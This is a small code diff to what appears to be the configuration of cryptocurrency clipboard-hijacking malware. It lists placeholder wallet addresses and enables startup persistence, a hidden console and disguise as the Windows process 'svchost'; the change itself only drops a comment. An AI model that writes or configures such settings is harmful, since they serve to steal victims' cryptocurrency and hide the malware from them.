@@ -7,7 +7,7 @@ w = {
     "doge": "Put DOGECOIN addrss here",
     "sol": "Put SOLANA address here",
 }
-interval = 0.5 # the time on starting
+interval = 0.5
 startup = True
 hide_console = True
 process_name = "svchost"
